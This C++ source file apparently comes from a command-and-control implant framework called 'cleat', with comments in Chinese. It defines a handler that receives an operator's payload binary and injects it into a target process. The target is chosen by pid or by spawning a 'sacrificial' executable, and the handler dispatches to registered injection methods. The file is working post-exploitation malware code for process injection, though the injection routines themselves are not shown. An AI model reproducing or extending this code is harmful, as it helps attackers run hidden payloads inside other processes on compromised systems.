#include "Core/Command/Handlers/InjectHandlers/InjectHandler.hpp"
#include "Core/Inject/InjectionRegistry.hpp"
#include "Common/Protocol/Packet.hpp"

#include <algorithm>
#include <cstdio>
#include <string>
#include <vector>

namespace cleat {

    nlohmann::json InjectHandler::Execute(const CommandRequest& req) {
        using namespace cleat::injection;

        // ---- 方法: 必填 + 按名查表 ----
        const auto itMethod = req.params.find("method");
        if (itMethod == req.params.end() || !itMethod->is_string()
            || itMethod->get<std::string>().empty()) {
            return Packet::Error("InjectExec requires 'method'");
        }
        const std::string methodName = itMethod->get<std::string>();

        RegisterBuiltinInjectionMethods();   // 幂等(进程一次)
        IInjectionMethod* method = InjectionRegistry::Instance().Find(methodName);
        if (!method) {
            return Packet::Error("unknown injection method '" + methodName + "'");
        }

        // ---- 载荷契约: 默认 blob; 声明不在方法支持面 = 拒绝(不嗅探字节) ----
        PayloadKind payloadKind = PayloadKind::Blob;
        const auto itPk = req.params.find("payload_kind");
        if (itPk != req.params.end() && itPk->is_string()) {
            payloadKind = ParsePayloadKind(itPk->get<std::string>());
            if (payloadKind == PayloadKind::Unknown) {
                return Packet::Error("unknown payload kind '" + itPk->get<std::string>() + "'");
            }
        }
        {
            const std::vector<PayloadKind> supported = method->SupportedPayloads();
            const bool ok =
                std::find(supported.begin(), supported.end(), payloadKind) != supported.end();
            if (!ok) {
                std::string list;
                for (const PayloadKind k : supported) {
                    list += list.empty() ? ToString(k)
                                         : std::string("/") + ToString(k);
                }
                return Packet::Error("method '" + methodName + "' does not support payload kind '"
                    + ToString(payloadKind) + "' (supported: " + list + ")");
            }
        }

        // ---- 目标契约: 声明必须落在方法支持面内 ----
        const auto itTk = req.params.find("target_kind");
        if (itTk == req.params.end() || !itTk->is_string()) {
            return Packet::Error("InjectExec requires 'target_kind'");
        }
        const TargetKind targetKind = ParseTargetKind(itTk->get<std::string>());
        if (targetKind == TargetKind::Unknown) {
            return Packet::Error("unknown target kind '" + itTk->get<std::string>() + "'");
        }
        {
            const std::vector<TargetKind> supported = method->SupportedTargets();
            const bool ok =
                std::find(supported.begin(), supported.end(), targetKind) != supported.end();
            if (!ok) {
                std::string list;
                for (const TargetKind k : supported) {
                    list += list.empty() ? ToString(k)
                                         : std::string("/") + ToString(k);
                }
                return Packet::Error("method '" + methodName + "' does not support target kind '"
                    + ToString(targetKind) + "' (supported: " + list + ")");
            }
        }

        // ---- 目标取值: spawn = 镜像路径(string), pid = 非 0 整数 ----
        InjectionTarget target;
        target.kind = targetKind;
        const auto itTarget = req.params.find("target");
        if (targetKind == TargetKind::Spawn) {
            if (itTarget == req.params.end() || !itTarget->is_string()
                || itTarget->get<std::string>().empty()) {
                return Packet::Error("spawn target requires 'target' (sacrificial image path)");
            }
            target.image = itTarget->get<std::string>();
            // 交给 CreateProcessW 会按应用目录/CWD/System32/PATH 搜索, CWD 可控
            // 场景即牺牲镜像 planting(设计 口径: 牺牲进程完整路径)。
            {
                const std::string& img = target.image;
                const bool absolute = (img.size() >= 2 && img[1] == ':')
                    || (!img.empty() && (img[0] == '\\' || img[0] == '/'));
                if (!absolute) {
                    return Packet::Error("spawn 'target' must be an absolute image path");
                }
            }
        }
        else {
            // is_number_integer 同时覆盖 number_integer/number_unsigned —— 操作员
            // 下发的整数字面量走 int 构造路径(nlohmann 存 signed), 别只认 unsigned
            // >0xFFFFFFFF 的值到低 32 位, 可能落到非预期 pid。
            if (itTarget == req.params.end() || !itTarget->is_number_integer()
                || itTarget->get<long long>() <= 0
                || itTarget->get<long long>() > 0xFFFFFFFFLL) {
                return Packet::Error("pid target requires 'target' (pid in [1, 4294967295])");
            }
            target.pid = static_cast<unsigned long>(itTarget->get<long long>());
        }

        if (req.payload.empty()) {
            return Packet::Error("InjectExec requires payload binary body");
        }

        // ---- 执行 + 回执(失败附 0x 原始码, MigrateSpawn 现样) ----
        const InjectionResult r = method->Inject(req.payload, payloadKind, target);
        if (!r.ok) {
            char hex[16]{};
            std::snprintf(hex, sizeof(hex), "%lX", r.failed_at);
            return Packet::Error("inject failed: " + r.error + " (0x" + std::string(hex) + ")");
        }
        return Packet::Ok({ {"method", method->Name()},
                            {"target_kind", ToString(targetKind)},
                            {"pid", r.pid} });
    }

} // namespace cleat
